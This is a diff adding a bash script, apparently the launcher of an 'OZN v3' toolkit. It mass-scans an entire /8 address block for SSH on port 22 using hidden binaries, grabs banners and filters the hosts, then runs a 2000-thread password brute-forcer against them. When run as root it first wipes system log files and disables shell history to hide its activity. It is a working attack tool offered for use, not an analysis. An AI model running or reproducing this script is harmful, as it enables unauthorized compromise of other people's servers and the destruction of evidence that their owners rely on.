@@ -1,0 +1,97 @@
+#!/bin/bash
+
+RES='\033[0m'
+WHT='\033[38;5;231m'
+RED='\033[38;5;124m'
+YEL='\033[38;4;226m'
+MAG='\033[38;5;165m'
+PRP='\033[38;5;093m'
+
+NGRN='\033[38;5;048m'
+NBLU='\033[38;5;051m'
+NORA='\033[38;5;202m'
+NRED='\033[38;5;196m'
+
+if [ $# != 3 ]; 
+then
+    echo -e "$NRED[$NGRN-$NRED] ${WHT}Syntax: $0 <a block> <authkey> <user>$RES"
+	exit;
+fi
+
+rm -rf banner.log ips.lst scan.lst bios.txt tempbios.txt
+
+# (Settings)
+timeout=10         #( Bruteforce ip connection timeout )
+threads=2000       #( Bruteforce threads )
+port=22            #( Scan port )
+pass_file=pass     #( Passfile )
+banthread=1000     #( Banner grabber threads )
+
+if [[ $(id -u) -ne 0 ]];
+then
+	rm -rf ~/.bash_history
+
+    clear
+    echo -e "$NRED[$NGRN-$NRED] ${WHT}Please use this as uid0 (root or sudo)"
+    sleep 1
+    exit;
+else
+    sync; echo 1 > /proc/sys/vm/drop_caches
+    sync; echo 2 > /proc/sys/vm/drop_caches
+    sync; echo 3 > /proc/sys/vm/drop_caches
+
+    clear ; unset ; rm -rf /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog /root/.bash_history ; unset HISTFILE ; unset HISTSAVE ; unset HISTLOG ; history -n ; unset WATCH ; export HISTFILE=/dev/null ; export HISTFILE=/dev/null
+fi
+
+clear
+echo -e "\e[38;5;46m╔═══════════════════════════════════════════════════════════╗"
+echo -e "\e[38;5;47m║       ██████╗ ███████╗███╗   ██╗    ██╗   ██╗██████╗      ║"
+echo -e "\e[38;5;48m║      ██╔═══██╗╚══███╔╝████╗  ██║    ██║   ██║╚════██╗     ║"
+echo -e "\e[38;5;49m║      ██║   ██║  ███╔╝ ██╔██╗ ██║    ██║   ██║ █████╔╝     ║"
+echo -e "\e[38;5;50m║      ██║   ██║ ███╔╝  ██║╚██╗██║    ╚██╗ ██╔╝ ╚═══██╗     ║"
+echo -e "\e[38;5;51m║      ╚██████╔╝███████╗██║ ╚████║     ╚████╔╝ ██████╔╝     ║"
+echo -e "\e[38;5;87m║       ╚═════╝ ╚══════╝╚═╝  ╚═══╝      ╚═══╝  ╚═════╝      ║"
+echo -e "\e[38;5;48m╠═══════════════════════════════════════════════════════════╣"
+echo -e "\e[38;5;49m║                    qAd1tz   &   Raducu                    ║"
+echo -e "\e[38;5;51m╚═══════════════════════════════════════════════════════════╝\033[0m"
+echo " "
+sleep 2
+echo -e "$NGRN[$NBLU+$NGRN] $PRP- ${WHT}OZN masscan started!$RES"
+echo -e "$NGRN[$NBLU+$NGRN] $PRP- ${WHT}Port: $port$RES"
+echo -e "$NGRN[$NBLU+$NGRN] $PRP- ${WHT}Range: $1$RES"
+sleep 3
+./.sozn --range $1.0.0.0-$1.255.255.255 -p$port --max-rate 150000 --exclude 255.255.255.255 --exclude 10.0.0.0/8 --exclude 192.168.0.0/16 --exclude 127.0.0.0/8 -oL tempbios.txt
+sleep 2
+pkill -f .sozn
+
+clear
+cat tempbios.txt | awk '{ print $4 }' > bios.txt
+rm -rf tempbios.txt
+echo -e "$NGRN[$NBLU+$NGRN] $PRP- ${WHT}OZN banner grabber started!$RES"
+echo -e "$NGRN[$NBLU+$NGRN] $PRP- ${WHT}Please wait some seconds..$RES"
+echo " "
+sleep 3
+./.bozn $banthread $port bios.txt > /dev/null
+sleep 1
+pkill -f .bozn
+
+./.fozn banner.log
+
+ipsc=`grep -c . ips.lst`
+passl=`grep -c . $pass_file`
+
+clear
+echo -e "$NGRN[$NBLU+$NGRN] $PRP- ${WHT}OZN bruteforce started!$RES"
+echo -e "$NGRN[$NBLU+$NGRN] $PRP- ${WHT}Port: ${NBLU}$port$RES"
+echo -e "$NGRN[$NBLU+$NGRN] $PRP- ${WHT}Threads: ${NBLU}$threads$RES"
+echo -e "$NGRN[$NBLU+$NGRN] $PRP- ${WHT}Timeout: ${NBLU}$timeout$RES"
+echo -e "$NGRN[$NBLU+$NGRN] $PRP- ${WHT}IP list lines: ${NBLU}$ipsc$RES"
+echo -e "$NGRN[$NBLU+$NGRN] $PRP- ${WHT}Passfile lines: ${NBLU}$passl$RES"
+echo " "
+sleep 3
+./brute $threads ips.lst $pass_file $port $timeout $2 $3
+sleep 10
+pkill brute
+
+echo -e "$NGRN[$NBLU+$NGRN] $PRP- ${WHT}OZN bruteforce is now done!$RES"
+echo -e "$NGRN[$NBLU+$NGRN] $PRP- ${WHT}Use './filter' to filter good servers.$RES"
